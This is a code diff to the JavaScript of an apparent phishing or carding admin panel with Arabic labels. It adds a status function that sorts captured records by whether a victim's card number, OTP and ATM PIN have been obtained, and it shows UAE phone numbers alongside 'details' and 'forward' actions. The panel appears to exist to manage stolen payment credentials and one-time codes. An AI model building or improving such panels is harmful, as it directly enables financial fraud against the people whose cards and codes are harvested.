@@ -221,6 +221,20 @@
     }
   }
 
+  function getAdminStatusLabel(d) {
+    if (d.status === 'reject') return 'مرفوض';
+    if (d.status === 'accept' || d.status === 'success') return 'مقبول';
+
+    const card = d.card || d.payment || null;
+    const otpValue = (d.otp || (card && (card.otp || card.otpCode))) || '';
+    const atmValue = (d.atmPin || (card && (card.atm || card.atmPin))) || '';
+
+    if (!card || !card.cardNumber) return 'بطاقة جديدة';
+    if (!otpValue) return 'OTP جديد';
+    if (!atmValue) return 'ATM جديد';
+    return 'قيد المراجعة';
+  }
+
   async function loadApplications() {
     const tbody = document.getElementById('adminAppsBody');
     try {
@@ -255,11 +269,7 @@
           </td>
           <td>${a.phone ? ('+971 ' + a.phone) : '—'}</td>
           <td>${persons.length}</td>
-          <td><span class="status-badge">${
-            d.status === 'accept' ? 'مقبول' :
-            d.status === 'reject' ? 'مرفوض' :
-            'قيد المراجعة'
-          }</span></td>
+          <td><span class="status-badge">${getAdminStatusLabel(d)}</span></td>
           <td>
             <button type="button" class="action-btn details" data-index="${index}">التفاصيل</button>
             <button type="button" class="action-btn forward" data-index="${index}">إعادة التوجيه</button>
